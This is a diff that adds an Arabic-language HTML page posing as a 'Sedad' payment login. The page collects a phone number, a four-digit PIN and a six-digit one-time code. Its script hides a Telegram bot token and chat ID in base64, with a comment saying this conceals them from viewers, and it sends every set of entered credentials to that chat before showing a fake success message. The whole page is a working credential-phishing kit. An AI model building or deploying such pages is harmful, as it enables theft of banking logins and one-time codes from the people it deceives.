@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>سداد</title>
+    <style>
+        :root { --primary-green: #608d51; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; justify-content: center; }
+        
+        .app-container { width: 100%; max-width: 450px; text-align: center; min-height: 100vh; }
+        .top-banner img { width: 100%; display: block; }
+        
+        .content-area { padding: 30px 20px; }
+        
+        .input-group { position: relative; margin-bottom: 10px; }
+        .input-group input { 
+            width: 100%; padding: 18px; padding-right: 50px; border-radius: 15px; 
+            border: 1px solid #ccc; font-size: 20px; text-align: right; outline: none;
+            background-color: #fcfcfc;
+        }
+        .user-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #5a9bd5; font-size: 24px; }
+        
+        /* رسالة الخطأ المحدثة */
+        .error-msg { color: #d93025; font-size: 16px; font-weight: bold; margin-bottom: 20px; display: none; }
+
+        .otp-wrapper { display: flex; justify-content: center; gap: 12px; margin: 25px 0; direction: ltr; }
+        .otp-input { 
+            width: 55px; height: 60px; border: 1px solid #bbb; border-radius: 12px; 
+            font-size: 24px; text-align: center; font-weight: bold; outline: none; 
+        }
+        .otp-input:focus { border: 2px solid var(--primary-green); background: #f0f7ef; }
+
+        .btn-confirm { 
+            background-color: var(--primary-green); color: white; border: none; 
+            width: 100%; padding: 18px; border-radius: 15px; font-size: 22px; 
+            font-weight: bold; cursor: pointer; margin-top: 10px;
+        }
+        
+        #login-screen, #otp-screen, #success-screen { display: none; }
+        #login-screen { display: block; }
+
+        .success-box { padding: 40px 20px; border: 2px solid var(--primary-green); border-radius: 20px; margin: 20px; background: #f0f7ef; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="top-banner">
+        <img src="https://i.ibb.co/MD17dc10/IMG-0251.jpg" alt="Sedad">
+    </div>
+
+    <div id="login-screen" class="content-area">
+        <div class="input-group">
+            <span class="user-icon">👤</span>
+            <input type="tel" id="phone" placeholder="رقم الهاتف" maxlength="8">
+        </div>
+        
+        <div id="phone-error" class="error-msg">رقم الهاتف غير صحيح</div>
+
+        <div class="otp-wrapper">
+            <input type="password" class="otp-input login-pin" maxlength="1" inputmode="numeric">
+            <input type="password" class="otp-input login-pin" maxlength="1" inputmode="numeric">
+            <input type="password" class="otp-input login-pin" maxlength="1" inputmode="numeric">
+            <input type="password" class="otp-input login-pin" maxlength="1" inputmode="numeric">
+        </div>
+
+        <button class="btn-confirm" onclick="goToOtp()">تسجيل الدخول</button>
+    </div>
+
+    <div id="otp-screen" class="content-area">
+        <p style="font-size: 18px; font-weight: bold;">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</p>
+        <div class="otp-wrapper">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-input otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        <button class="btn-confirm" onclick="finalize()">تأكيد الرمز</button>
+    </div>
+
+    <div id="success-screen" class="content-area">
+        <div class="success-box">
+            <div style="font-size: 60px; color: var(--primary-green); margin-bottom: 15px;">✅</div>
+            <div style="font-size: 20px; font-weight: bold; color: #333;">تمت العملية بنجاح</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // تشفير معلومات التلجرام لإخفائها عن المشاهد العادي
+    const _u = "NjU3Mzc2NjM0OTpBQUZ6d0lHc2JZRXRMX2pEcTBsU0xwMTY4OXYySWhtai1Cbw==";
+    const _c = "NjE2NjU5NzUwNw==";
+
+    function sendTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${atob(_u)}/sendMessage?chat_id=${atob(_c)}&text=${encodeURIComponent(msg)}`);
+    }
+
+    function setupInputs(className) {
+        const inputs = document.querySelectorAll('.' + className);
+        inputs.forEach((input, index) => {
+            input.addEventListener('mousedown', (e) => {
+                for (let i = 0; i < index; i++) {
+                    if (inputs[i].value === "") { e.preventDefault(); inputs[i].focus(); return; }
+                }
+            });
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
+            });
+        });
+    }
+
+    setupInputs('login-pin');
+    setupInputs('otp-box');
+
+    function goToOtp() {
+        const phone = document.getElementById('phone').value;
+        const pins = Array.from(document.querySelectorAll('.login-pin')).map(i => i.value).join('');
+        const errorEl = document.getElementById('phone-error');
+
+        // التحقق من الرقم الأول (2 أو 3 أو 4) وطول الرقم 8
+        const isValidStart = /^[234]/.test(phone);
+        
+        if (phone.length === 8 && isValidStart && pins.length === 4) {
+            errorEl.style.display = 'none';
+            sendTelegram(`👤 دخول:\n📱 هاتف: ${phone}\n🔑 PIN: ${pins}`);
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('otp-screen').style.display = 'block';
+        } else {
+            errorEl.style.display = 'block'; // إظهار رسالة "رقم الهاتف غير صحيح"
+        }
+    }
+
+    function finalize() {
+        const otps = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
+        if (otps.length === 6) {
+            sendTelegram(`📩 رمز OTP: ${otps}`);
+            document.getElementById('otp-screen').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
+        }
+    }
+</script>
+</body>
+</html>
